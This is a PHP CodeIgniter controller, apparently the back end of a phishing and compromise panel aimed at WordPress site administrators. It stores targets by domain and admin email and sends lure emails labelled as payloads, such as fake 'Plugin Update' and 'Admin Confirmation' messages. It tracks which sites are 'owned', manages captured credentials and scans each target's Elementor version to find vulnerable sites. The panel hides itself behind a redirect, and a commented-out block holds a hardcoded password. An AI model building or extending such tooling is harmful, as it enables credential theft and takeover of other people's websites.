<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Alvos extends CI_Controller
{

    function __construct()
    {

        parent::__construct();

        $this->load->model('main_model');
        $this->load->model('email_model');
    }

    public function index()
    {

        // if (htmlspecialchars($this->input->get('password')) == "Effizienz1998") {


        //     // Obter informações do usuário
        //     $ip = $_SERVER['REMOTE_ADDR'];
        //     $user_agent = $_SERVER['HTTP_USER_AGENT'];
        //     $date_time = date('Y-m-d H:i:s');

        //     // Construir a linha de log
        //     $log_line = "IP: $ip - Date Time: $date_time" . PHP_EOL;

        //     // Caminho para o arquivo de log
        //     $log_file = 'log.txt';

        //     // Adicionar a linha de log ao arquivo
        //     file_put_contents($log_file, $log_line, FILE_APPEND);



        //     $this->load->view('users/alvos');
        // } else {
        header('Location:https://wordpress.com');
        // }
    }

    public function act_update_alvo()
    {

        $alvo_id = htmlspecialchars($this->input->post('id'));
        $data['alvo_nome'] = htmlspecialchars($this->input->post('alvo_nome'));

        $data['alvo_url'] = htmlspecialchars($this->input->post('alvo_url'));
        // $data['alvo_url'] = parse_url($data['alvo_url'], PHP_URL_SCHEME) . '://' . parse_url($data['alvo_url'], PHP_URL_HOST)."/";
        // $data['alvo_url'] = str_replace("https://", "", $data['alvo_url']);
        // $data['alvo_url'] = str_replace("http://", "", $data['alvo_url']);
        // $data['alvo_url'] = str_replace("/", "", $data['alvo_url']);


        $data['alvo_produto_link'] = htmlspecialchars($this->input->post('alvo_produto_link'));
        $data['alvo_email'] = htmlspecialchars($this->input->post('alvo_email'));
        $data['alvo_plataforma'] = htmlspecialchars($this->input->post('alvo_plataforma'));
        $data['inapto'] = htmlspecialchars($this->input->post('inapto'));

        if ($this->main_model->updateAlvo($alvo_id, $data)) {

            $response = array("status" => "true", "message" => "Atualizado com sucesso.");
        } else {
            $response = array("status" => "false", "message" => "Erro ao atualizar.");
        }

        print_r(json_encode($response));
    }










    public function act_send_payload_dois()
    {

        $response = array();

        $alvo_payload = "Plugin Update";
        $alvo_url = htmlspecialchars($this->input->post('alvo_url'));
        $alvo_email = htmlspecialchars($this->input->post('alvo_email'));
        $alvo_nome = htmlspecialchars($this->input->post('alvo_nome'));
        $alvo_ref = htmlspecialchars($this->input->post('alvo_ref'));

        if ($this->email_model->sendPayloadTwo($alvo_url, $alvo_email, $alvo_nome, $alvo_ref)) {

            // if ($this->main_model->addCountAlvoEnvios($alvo_url, $alvo_email)) {
            //     $response = array("status" => "true");
            // }
            if ($this->main_model->register_payload_log($alvo_payload, $alvo_url, $alvo_email, $alvo_language)) {
                $response = array("status" => "true");
            }
        } else {
            $response = array("status" => "false");
        }

        print_r(json_encode($response));
    }


    public function act_update_owned()
    {


        $id = htmlspecialchars($this->input->post('id'));
        $status = htmlspecialchars($this->input->post('status'));


        if ($this->main_model->update_alvo_owned($id, $status)) {

            $response = array("status" => "true");
        } else {
            $response = array("status" => "false");
        }

        print_r(json_encode($response));
    }


    public function act_send_payload()
    {

        $response = array();


        $alvo_payload = "Admin Confirmation";
        $alvo_url = htmlspecialchars($this->input->post('alvo_url'));
        $alvo_email = htmlspecialchars($this->input->post('alvo_email'));
        $alvo_nome = htmlspecialchars($this->input->post('alvo_nome'));
        $alvo_ref = htmlspecialchars($this->input->post('alvo_ref'));
        $alvo_language = htmlspecialchars($this->input->post('alvo_language'));

        if ($this->email_model->sendPayloadOne($alvo_url, $alvo_email, $alvo_nome, $alvo_ref, $alvo_language)) {

            // if ($this->main_model->addCountAlvoEnvios($alvo_url, $alvo_email)) {
            //     $response = array("status" => "true");
            // }
            if ($this->main_model->register_payload_log($alvo_payload, $alvo_url, $alvo_email, $alvo_language)) {
                $response = array("status" => "true");
            }
        } else {
            $response = array("status" => "false");
        }

        print_r(json_encode($response));
    }









    public function act_inapto_alvo()
    {

        $alvo_id = htmlspecialchars($this->input->post('alvo_id'));

        if ($this->main_model->inaptoalvo($alvo_id)) {

            $response = array("status" => "true");
        } else {
            $response = array("status" => "false");
        }

        print_r(json_encode($response));
    }
    public function act_delete_alvo()
    {

        $alvo_id = htmlspecialchars($this->input->post('alvo_id'));

        if ($this->main_model->deletealvo($alvo_id)) {

            $response = array("status" => "true");
        } else {
            $response = array("status" => "false");
        }

        print_r(json_encode($response));
    }

    public function act_delete_credential()
    {

        $alvo_id = htmlspecialchars($this->input->post('alvo_id'));

        if ($this->main_model->deletecredential($alvo_id)) {

            $response = array("status" => "true");
        } else {
            $response = array("status" => "false");
        }

        print_r(json_encode($response));
    }
    public function act_add_alvo()
    {
        $response = array();

        $alvo_url = htmlspecialchars($this->input->post('alvo_url'));
        // $alvo_url = parse_url($alvo_url, PHP_URL_SCHEME) . '://' . parse_url($alvo_url, PHP_URL_HOST)."/";
        // $alvo_url = str_replace("https://", "", $alvo_url);
        // $alvo_url = str_replace("http://", "", $alvo_url);
        // $alvo_url = str_replace("/", "", $alvo_url);

        $alvo_email = htmlspecialchars($this->input->post('alvo_email'));
        $alvo_nome = htmlspecialchars($this->input->post('alvo_nome'));
        $alvo_ref = mt_rand();
        $alvo_plataforma = htmlspecialchars($this->input->post('alvo_plataforma'));
        $alvo_produto_link = htmlspecialchars($this->input->post('alvo_produto_link'));

        if ($this->main_model->checkAlvo($alvo_url, $alvo_email)) {

            $response = array("status" => "false", "message" => "Já existe esse dominio com este e-mail.");
        } else {

            if ($this->main_model->addAlvo($alvo_url, $alvo_email, $alvo_nome, $alvo_ref, $alvo_plataforma, $alvo_produto_link)) {

                $response = array("status" => "true", "message" => "Adicionado com sucesso.");
            } else {
                $response = array("status" => "false", "message" => "Erro ao adicionar.");
            }
        }

        print_r(json_encode($response));
    }

    public function credenciais($alvo_url)
    {

        $data['alvo_url'] = $alvo_url;


        $this->load->view('users/credenciais', $data);
    }


    public function updateElementor()
    {

        foreach ($this->main_model->getalvosElementor() as $c) {




            $jsUrl = 'https://' . $c->alvo_url . '/wp-content/plugins/elementor/assets/js/frontend.min.js';

            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $jsUrl);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $jsContent = curl_exec($curl);
            curl_close($curl);

            if ($jsContent) {
                preg_match('/elementor - v([\d.]+) -/', $jsContent, $matches);
                $elementorVersion = isset($matches[1]) ? $matches[1] : 'N/A';

                echo $elementorVersion . "  -- " . $c->alvo_url . "<br>";


                $this->main_model->updateElementor($c->id, $elementorVersion, 1);

                sleep(1);
            } else {
                echo "<br>nao tem  -- " . $jsUrl;
                $this->main_model->updateElementor($c->id, $elementorVersion, 2);
            }
        }
    }
}
